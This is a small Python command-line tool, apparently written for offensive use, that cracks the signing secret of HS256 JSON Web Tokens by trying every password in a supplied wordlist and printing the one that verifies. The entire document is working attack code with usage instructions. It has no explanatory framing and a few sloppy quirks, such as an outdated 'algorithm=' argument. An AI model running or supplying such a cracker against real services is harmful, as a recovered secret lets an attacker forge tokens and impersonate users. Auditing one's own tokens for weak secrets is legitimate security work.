import jwt, sys 
from colorama import Fore,Style

def usage():
	print("\nUsage: "+sys.argv[0]+" -k [type] -w [wordlist] -t [token]\n")
	print("\t-h\t\targument For Help")
	print("\t-k [kind]\tyou can choose the value is hashed/encoded with [jwt, others_soooon]")
	print("\t-t [token]\tJWT token which wanna crack")
	print("\t-w [wordlist]\twordlist which will be used in cracking\n")


if "-h" in sys.argv:
	usage()
	exit()

try:
	wList = ""
	encodedValue = ""
	kind = ""

	for i in range(0, len(sys.argv)):

		if sys.argv[i] == "-t":
			encodedValue = sys.argv[i+1]

		elif sys.argv[i] == "-w":
			wList = sys.argv[i+1]

		elif sys.argv[i] == "-k":
			kind = sys.argv[i+1]


except IndexError:
	usage()
	exit()

def main():
	if kind == "jwt":
		jwtcrack()


def jwtcrack():
	try:
		wordlist = open(wList, "r")
	except IOError:
		print("[-] There is a problem with the wordlist [ "+ wList +" ]")
		exit()
	passwords = wordlist.readlines()
	wordlist.close()
	clearPwds = []
	print("\n[+] Collect The Passwords From The Wordlist ....")
	print("[+] Wordlist: " + Fore.GREEN + wList + Style.RESET_ALL)
	print("[+] Token: " + Fore.GREEN + encodedValue + Style.RESET_ALL)

	for pwd in passwords:
		npwd = pwd.replace("\n","")
		clearPwds.append(npwd.replace("\r",""))

	correctpwd = ""
	for pwd in clearPwds:
		try:
			decode = jwt.decode(encodedValue, pwd, algorithm='HS256')
			correctpwd = pwd
		except jwt.exceptions.InvalidSignatureError:
			pass
		except jwt.exceptions.DecodeError:
			print(Fore.RED + "[-] There is an error .." + Style.RESET_ALL)
			exit()

	if correctpwd == "":
		print("[+] The passsword not found ...\n")
		exit()
	else:
		print("[+] The password: " + Fore.GREEN + correctpwd + Style.RESET_ALL+"\n")

main()